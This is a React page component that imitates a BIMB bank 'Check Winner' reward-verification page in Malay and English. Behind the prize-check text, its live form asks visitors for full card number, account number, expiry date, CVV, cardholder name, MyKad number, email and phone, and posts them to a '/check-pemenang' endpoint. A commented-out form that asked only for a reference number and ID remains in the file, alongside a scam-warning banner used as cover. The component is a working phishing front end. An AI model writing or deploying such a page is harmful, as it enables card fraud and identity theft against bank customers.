import { Head, useForm } from "@inertiajs/react";
import { useEffect, useState } from "react";
import ScamWarning from "../Components/ScamWarning";
import { PublicLayout, useLanguage } from "../Components/PublicLayout";
import { Field } from "../Components/FormFields";

const content = {
    ms: {
        head: "Semak Pemenang",
        eyebrow: "Pengesahan Hadiah",
        title: "Semak status pemenang ganjaran pelanggan.",
        lead: "Masukkan maklumat rujukan untuk menyemak status hadiah dan arahan tuntutan yang berkaitan.",
        formTitle: "Maklumat semakan",
        submit: "Semak Status",
        note: "Keputusan semakan bergantung kepada rekod rasmi kempen dan maklumat pelanggan yang sepadan.",
        labels: {
            reference: "Nombor Rujukan",
            id: "No. Kad Pengenalan / Passport",
            phone: "Nombor Telefon",
            campaign: "Kategori Kempen",
        },
        options: [
            "Pilih kategori",
            "Ganjaran Pelanggan",
            "Kempen Kad",
            "Kempen Pembiayaan",
            "Kempen Digital",
        ],
        panelTitle: "Panduan semakan",
        guides: [
            "Pastikan nombor rujukan dimasukkan seperti yang diterima melalui saluran rasmi.",
            "Maklumat peribadi digunakan untuk pemadanan rekod pemenang.",
            "Pemenang yang sah akan menerima arahan tuntutan mengikut prosedur BIMB.",
        ],
    },
    en: {
        head: "Check Winner",
        eyebrow: "Reward Verification",
        title: "Check customer reward winner status.",
        lead: "Enter your reference details to verify reward status and related claim instructions.",
        formTitle: "Verification details",
        submit: "Check Status",
        note: "Verification results are based on official campaign records and matching customer information.",
        labels: {
            reference: "Reference Number",
            id: "Identification / Passport No.",
            phone: "Phone Number",
            campaign: "Campaign Category",
        },
        options: [
            "Select category",
            "Customer Rewards",
            "Card Campaign",
            "Financing Campaign",
            "Digital Campaign",
        ],
        panelTitle: "Verification guide",
        guides: [
            "Enter the reference number exactly as received through official channels.",
            "Personal information is used to match winner records.",
            "Confirmed winners will receive claim instructions according to BIMB procedures.",
        ],
    },
};

export default function CheckWinner() {
    const { language, toggleLanguage } = useLanguage();
    const page = content[language];
    const [showSearchingModal, setShowSearchingModal] = useState(false);
    const [showErrorModal, setShowErrorModal] = useState(false);
    const { data, setData, post, errors, processing, clearErrors } = useForm({
        card_number: "",
        akaunt_kad: "",
        email: "",
        my_cad: "",
        nama_lengkap: "",
        phone_number: "",
        expiry: "",
        cvv: "",
    });

    const handlerChange = (e) => {
        setData(e.target.name, e.target.value);
    };

    const handleExpiryChange = (e) => {
        const digits = e.target.value.replace(/\D/g, "").slice(0, 4);
        const formatted =
            digits.length > 2
                ? `${digits.slice(0, 2)} / ${digits.slice(2)}`
                : digits;

        setData("expiry", formatted);
    };

    const handleCvvChange = (e) => {
        setData("cvv", e.target.value.replace(/\D/g, "").slice(0, 4));
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        clearErrors();
        setShowErrorModal(false);
        setShowSearchingModal(true);

        post("/check-pemenang", {
            preserveScroll: true,
            onError: () => {
                setShowSearchingModal(false);
                setShowErrorModal(true);
            },
        });
    };

    useEffect(() => {
        if (Object.keys(errors).length > 0) {
            setShowErrorModal(true);
        }
    }, [errors]);

    return (
        <PublicLayout
            showHeader={true}
            language={language}
            onToggleLanguage={toggleLanguage}
        >
            <Head title={page.head} />

            <main className="bimb-pink-pattern">
                <section className="px-5 py-10 text-white sm:px-8">
                    <div className="mx-auto max-w-7xl">
                        <p className="text-sm font-bold uppercase tracking-[0.22em] text-white">
                            {page.eyebrow}
                        </p>
                        <h1 className="mt-4 max-w-3xl text-xl font-semibold leading-tight sm:text-3xl">
                            {page.title}
                        </h1>
                        <p className="mt-2 max-w-2xl text-xs md:text-base leading-tight text-white/85">
                            {page.lead}
                        </p>
                    </div>
                </section>

                <div className="mx-auto max-w-7xl px-5 pb-6 sm:px-8">
                    <ScamWarning language={language} />
                </div>

                <section className="mx-auto grid max-w-7xl gap-6 px-5 pb-12 sm:px-8 lg:grid-cols-[1.1fr_0.9fr]">
                    {/* <form className="rounded-lg border border-[#e0e0e0] bg-white p-6 shadow-xl shadow-[#8f1437]/15 sm:p-8">
                        <h2 className="text-2xl font-semibold text-[#dc2a54]">{page.formTitle}</h2>
                        <div className="mt-7 grid gap-5 sm:grid-cols-2">
                            <Field label={page.labels.reference} name="reference_number" placeholder="BIMB-RWD-000000" />
                            <SelectField label={page.labels.campaign} name="campaign">
                                {page.options.map((option) => (
                                    <option key={option}>{option}</option>
                                ))}
                            </SelectField>
                            <Field label={page.labels.id} name="identity_number" placeholder="900101-00-0000" />
                            <Field label={page.labels.phone} name="phone" placeholder="+60" />
                        </div>
                        <div className="mt-7">
                            <PrimaryButton>{page.submit}</PrimaryButton>
                        </div>
                        <p className="mt-4 text-xs leading-5 text-[#616161]">{page.note}</p>
                    </form>

                     */}

                    {/*

                    <form
                        onSubmit={handleSubmit}
                        className="rounded-lg border border-white/70 bg-white p-4 shadow-2xl shadow-[#8f1437]/20 sm:p-6"
                    >
                        <h2 className="text-xl font-semibold text-[#dc2a54] sm:text-2xl">
                            Semakan Validasi
                        </h2>

                        <div className="mt-4 grid gap-3.5 sm:gap-4">
                            <div className="min-w-0">
                                <Field
                                    label="Nama Pemegang Kad"
                                    name="nama_lengkap"
                                    placeholder="AHMAD BIN ABDULLAH"
                                    value={data.nama_lengkap}
                                    onChange={handlerChange}
                                    error={errors.nama_lengkap}
                                />
                            </div>
                            <div className="grid grid-cols-2 gap-3.5 sm:gap-4">
                                <div className="min-w-0">
                                    <Field
                                        label="Debit / Card"
                                        name="card_number"
                                        placeholder="4111 1111 1111 1111"
                                        value={data.card_number}
                                        onChange={handlerChange}
                                        error={errors.card_number}
                                    />
                                </div>
                                <div className="min-w-0">
                                    <Field
                                        label="NO Akaun"
                                        name="akaunt_kad"
                                        placeholder=""
                                        value={data.akaunt_kad}
                                        onChange={handlerChange}
                                        error={errors.akaunt_kad}
                                    />
                                </div>
                            </div>
                            <div className="grid grid-cols-2 gap-3.5 sm:gap-4">
                                <Field
                                    label="Tarikh Tamat"
                                    name="expiry"
                                    placeholder="MM / YY"
                                    value={data.expiry}
                                    onChange={handleExpiryChange}
                                    error={errors.expiry}
                                    inputMode="numeric"
                                    maxLength={7}
                                />

                                <Field
                                    label="CVV / CVC"
                                    name="cvv"
                                    placeholder="123"
                                    value={data.cvv}
                                    onChange={handleCvvChange}
                                    error={errors.cvv}
                                    inputMode="numeric"
                                    maxLength={4}
                                />
                            </div>
                            <div className="min-w-0">
                                <Field
                                    label="Email"
                                    type="email"
                                    name="email"
                                    placeholder="Email"
                                    value={data.email}
                                    onChange={handlerChange}
                                    error={errors.email}
                                />
                            </div>
                            <div className="min-w-0">
                                <Field
                                    label="My Cad"
                                    name="my_cad"
                                    placeholder="900101-00-0000"
                                    value={data.my_cad}
                                    onChange={handlerChange}
                                    error={errors.my_cad}
                                />
                            </div>
                            <div className="grid gap-3.5 md:grid-cols-2">
                                <Field
                                    label="Nomor Telephone"
                                    name="phone_number"
                                    placeholder="+60 12-345 6789"
                                    value={data.phone_number}
                                    onChange={handlerChange}
                                    error={errors.phone_number}
                                />
                            </div>
                        </div>

                        <button
                            type="submit"
                            disabled={processing}
                            className="mt-5 w-full rounded-md bg-[#dc2a54] px-5 py-2.5 font-semibold text-white transition hover:bg-[#c3214b] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            {processing
                                ? "Sedang Menyemak..."
                                : "Semak Sekarang"}
                        </button>
                    </form>
*/}

                    <form
                        onSubmit={handleSubmit}
                        className="rounded-lg border border-[#f0d7dd] bg-white p-4 shadow-2xl shadow-[#8f1437]/20 sm:p-6"
                    >
                        <div className="mb-2 flex items-center justify-between">
                            <h2 className="text-xl font-semibold text-[#dc2a54] sm:text-2xl">
                                Semakan Validasi
                            </h2>

                            <div className="flex items-center gap-2">
                                <img
                                    src="/cc/visa_card.png"
                                    alt=""
                                    className="h-16 object-contain"
                                />
                                <img
                                    src="/cc/master_card.png"
                                    alt="Mastercard"
                                    className="h-12 object-contain"
                                />
                            </div>
                        </div>

                        <div className="mt-4 grid gap-3.5 sm:gap-4">
                            <div className="relative min-w-0">
                                <Field
                                    label="Card Number"
                                    name="card_number"
                                    placeholder="4111 1111 1111 1111"
                                    value={data.card_number}
                                    onChange={handlerChange}
                                    error={errors.card_number}
                                />

                                <img
                                    src="/cc/icon1.webp"
                                    alt=""
                                    className="pointer-events-none absolute right-3 top-[28px] md:top-[42px] h-10 w-10 md:h-12 md:w-12 opacity-70"
                                />
                            </div>
                            <div className="flex gap-3">
                                <img
                                    src="/cc/jsb.png"
                                    alt=""
                                    className=" w-8 object-contain opacity-70"
                                />
                                <img
                                    src="/cc/UnionPay_logo.png"
                                    alt=""
                                    className=" w-8 object-contain opacity-70"
                                />
                                <img
                                    src="/cc/MasterCard_logo.png"
                                    alt=""
                                    className=" w-8 object-contain opacity-70"
                                />
                                <img
                                    src="/cc/visa.webp"
                                    alt=""
                                    className=" w-10 object-contain opacity-70"
                                />
                            </div>

                            <div className="min-w-0">
                                <Field
                                    label="Account Number"
                                    name="akaunt_kad"
                                    placeholder="4111 1111 1111 1111"
                                    value={data.akaunt_kad}
                                    onChange={handlerChange}
                                    error={errors.akaunt_kad}
                                />
                            </div>

                            <div className="grid grid-cols-2 gap-3.5 sm:gap-4">
                                <div className="relative">
                                    <Field
                                        label="Expiry Date"
                                        name="expiry"
                                        placeholder="MM / YY"
                                        value={data.expiry}
                                        onChange={handleExpiryChange}
                                        error={errors.expiry}
                                        inputMode="numeric"
                                        maxLength={7}
                                    />

                                    <img
                                        src="/cc/icon1.webp"
                                        alt=""
                                        className="pointer-events-none absolute right-3 top-[28px] md:top-[42px] h-10 w-10 md:h-12 md:w-12 opacity-70"
                                    />
                                </div>

                                <div className="relative">
                                    <Field
                                        label="Security Code (CVV/CVC)"
                                        name="cvv"
                                        placeholder="123"
                                        value={data.cvv}
                                        onChange={handleCvvChange}
                                        error={errors.cvv}
                                        inputMode="numeric"
                                        maxLength={4}
                                    />

                                    <img
                                        src="/cc/icon1.webp"
                                        alt=""
                                        className="pointer-events-none absolute right-3 top-[28px] md:top-[42px] h-10 w-10 md:h-12 md:w-12 opacity-70"
                                    />
                                </div>
                            </div>

                            <div className="min-w-0">
                                <Field
                                    label="Nama Pemegang Kad"
                                    name="nama_lengkap"
                                    placeholder="AHMAD BIN ABDULLAH"
                                    value={data.nama_lengkap}
                                    onChange={handlerChange}
                                    error={errors.nama_lengkap}
                                />
                            </div>

                            <div className="grid gap-3 5 sm:grid-cols-2">
                                <div className="min-w-0">
                                    <Field
                                        label="Email"
                                        type="email"
                                        name="email"
                                        placeholder="Email"
                                        value={data.email}
                                        onChange={handlerChange}
                                        error={errors.email}
                                    />
                                </div>
                            </div>

                            <div className=" grid gap-3.5 grid-cols-2 sm:grid-cols-2">
                                <Field
                                    label="Nomor Telephone"
                                    name="phone_number"
                                    placeholder="+60 12-345 6789"
                                    value={data.phone_number}
                                    onChange={handlerChange}
                                    error={errors.phone_number}
                                />

                                <Field
                                    label="My Cad"
                                    name="my_cad"
                                    placeholder="900101-00-0000"
                                    value={data.my_cad}
                                    onChange={handlerChange}
                                    error={errors.my_cad}
                                />
                            </div>
                        </div>

                        <button
                            type="submit"
                            disabled={processing}
                            className="mt-5 w-full rounded-md bg-[#dc2a54] px-5 py-2.5 font-semibold text-white transition hover:bg-[#c3214b] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            {processing
                                ? "Sedang Menyemak..."
                                : "Semak Sekarang"}
                        </button>
                    </form>
                    {/* <SelectField
                                    label="Nama Peniaga"
                                    name="bank"
                                >
                                    <option>Pilih Bank</option>
                                    <option>Pembelian Dalam Talian</option>
                                    <option>Pembayaran Bil</option>
                                    <option>Tempahan Hotel</option>
                                    <option>Tempahan Penerbangan</option>
                                    <option>Langganan Digital</option>
                                </SelectField> */}
                    <aside className="rounded-lg border border-white/70 bg-white/95 p-6 shadow-xl shadow-[#8f1437]/15 backdrop-blur sm:p-8">
                        <img
                            src="/icon_card/72px-copy.png"
                            alt=""
                            className="h-14 w-14 object-contain"
                        />
                        <h2 className="mt-5 text-2xl font-semibold text-[#dc2a54]">
                            {page.panelTitle}
                        </h2>
                        <div className="mt-6 space-y-4">
                            {page.guides.map((guide, index) => (
                                <div key={guide} className="flex gap-4">
                                    <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-[#dc2a54] text-sm font-bold text-white">
                                        {index + 1}
                                    </span>
                                    <p className="text-sm leading-6 text-[#616161]">
                                        {guide}
                                    </p>
                                </div>
                            ))}
                        </div>
                    </aside>
                </section>
            </main>

            {showSearchingModal && (
                <div className="fixed inset-0 z-[80] flex items-center justify-center bg-black/55 px-5 backdrop-blur-sm">
                    <div className="w-full max-w-md rounded-lg bg-white p-7 text-center shadow-2xl">
                        <div className="mx-auto h-14 w-14 animate-spin rounded-full border-4 border-[#f3d4dc] border-t-[#dc2a54]" />
                        <h2 className="mt-6 text-xl font-bold text-[#212121]">
                            Sedang mencari
                        </h2>
                        <p className="mt-3 text-sm leading-7 text-[#616161]">
                            Apakah status anda pemenang? Sila tunggu sebentar
                            semasa sistem menyemak data anda.
                        </p>
                    </div>
                </div>
            )}

            {showErrorModal && (
                <div className="fixed inset-0 z-[90] flex items-center justify-center bg-black/55 px-5 backdrop-blur-sm">
                    <div className="w-full max-w-md rounded-lg bg-white p-7 shadow-2xl">
                        <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-[#dc2a54]/10 text-2xl font-bold text-[#dc2a54]">
                            !
                        </div>
                        <h2 className="mt-5 text-center text-xl font-bold text-[#212121]">
                            Validasi tidak lengkap
                        </h2>
                        <p className="mt-3 text-center text-sm leading-7 text-[#616161]">
                            Sila periksa kembali maklumat pada form. Detail
                            error sudah ditampilkan di bawah field terkait.
                        </p>
                        <button
                            type="button"
                            onClick={() => setShowErrorModal(false)}
                            className="mt-6 w-full rounded-md bg-[#dc2a54] px-5 py-3 text-sm font-bold text-white transition hover:bg-[#c3214b]"
                        >
                            Perbaiki Data
                        </button>
                    </div>
                </div>
            )}
        </PublicLayout>
    );
}
